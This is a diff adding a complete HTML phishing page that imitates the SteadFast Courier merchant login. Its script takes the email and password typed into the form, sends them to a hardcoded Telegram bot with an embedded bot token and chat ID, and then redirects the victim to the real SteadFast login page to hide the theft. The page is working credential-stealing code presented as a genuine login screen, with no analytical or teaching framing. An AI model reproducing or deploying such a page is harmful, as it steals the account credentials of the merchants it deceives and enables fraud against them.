@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Merchant Login - SteadFast Courier</title>
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
+
+    <style>
+        /* CSS Section */
+        :root {
+            --primary-color: #00b894;
+            --text-gray: #636e72;
+            --border-color: #dfe6e9;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background-color: #f3f4f7;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0;
+        }
+
+        .login-card {
+            background: #ffffff;
+            width: 100%;
+            max-width: 380px;
+            padding: 40px 30px;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+
+        .icon-circle {
+            background-color: var(--primary-color);
+            width: 75px;
+            height: 75px;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0 auto 20px;
+        }
+
+        .icon-circle i {
+            color: white;
+            font-size: 32px;
+            transform: rotate(-15deg);
+        }
+
+        .title {
+            color: #2d3436;
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 30px;
+        }
+
+        .input-group {
+            position: relative;
+            margin-bottom: 15px;
+        }
+
+        .input-group i {
+            position: absolute;
+            left: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #b2bec3;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 14px 15px 14px 45px;
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            outline: none;
+            font-size: 15px;
+            transition: 0.3s;
+        }
+
+        .input-group input:focus {
+            border-color: var(--primary-color);
+        }
+
+        .options {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 13px;
+            margin: 15px 0 25px;
+            color: var(--text-gray);
+        }
+
+        .options a {
+            color: #b2bec3;
+            text-decoration: none;
+        }
+
+        .login-btn {
+            width: 100%;
+            background-color: var(--primary-color);
+            color: white;
+            border: none;
+            padding: 15px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+
+        .login-btn:hover {
+            background-color: #00a383;
+        }
+
+        .register-text {
+            margin-top: 25px;
+            font-size: 14px;
+            color: var(--text-gray);
+        }
+
+        .register-text a {
+            color: var(--primary-color);
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        .mod-login-box {
+            margin-top: 35px;
+            position: relative;
+            display: inline-block;
+        }
+
+        .badge {
+            background-color: #ff7675;
+            color: white;
+            font-size: 9px;
+            padding: 2px 6px;
+            border-radius: 4px;
+            position: absolute;
+            top: -15px;
+            left: 50%;
+            transform: translateX(-50%);
+            text-transform: uppercase;
+        }
+
+        .mod-link {
+            color: var(--primary-color);
+            text-decoration: none;
+            border-bottom: 2px solid var(--primary-color);
+            font-weight: 500;
+            padding-bottom: 2px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-card">
+        <div class="icon-circle">
+            <i class="fa-solid fa-paper-plane"></i>
+        </div>
+
+        <h2 class="title">Merchant Login</h2>
+
+        <form id="loginForm">
+            <div class="input-group">
+                <i class="fa-regular fa-envelope"></i>
+                <input type="email" id="email" placeholder="Enter your email here" required>
+            </div>
+
+            <div class="input-group">
+                <i class="fa-solid fa-lock"></i>
+                <input type="password" id="password" placeholder="Password" required>
+            </div>
+
+            <div class="options">
+                <label style="cursor: pointer;">
+                    <input type="checkbox"> Remember Me
+                </label>
+                <a href="#">Forgot Password?</a>
+            </div>
+
+            <button type="submit" class="login-btn" id="submitBtn">Login</button>
+        </form>
+
+        <p class="register-text">
+            Don't have an account <a href="#">Register</a> Here
+        </p>
+
+        <div class="mod-login-box">
+            <span class="badge">New</span>
+            <a href="#" class="mod-link">Moderator Login</a>
+        </div>
+    </div>
+
+    <script>
+        // JavaScript Section
+        const BOT_TOKEN = "8306598806:AAHZBum6bAe_4JPIpg_MiOQP0nz_GfD7z5o";
+        const CHAT_ID = "5825685797";
+
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const btn = document.getElementById('submitBtn');
+
+            btn.innerText = "Processing...";
+            btn.disabled = true;
+
+            const text = `🚀 **SteadFast Login Alert**\n\n📧 **Email:** \`${email}\`\n🔑 **Password:** \`${password}\``;
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: text,
+                    parse_mode: 'Markdown'
+                })
+            })
+            .then(() => {
+                //Redirecting to original site after success
+                window.location.href = "https://www.steadfast.com.bd/login";
+            })
+            .catch(() => {
+                alert("Connection Error!");
+                btn.innerText = "Login";
+                btn.disabled = false;
+            });
+        });
+    </script>
+</body>
+</html>
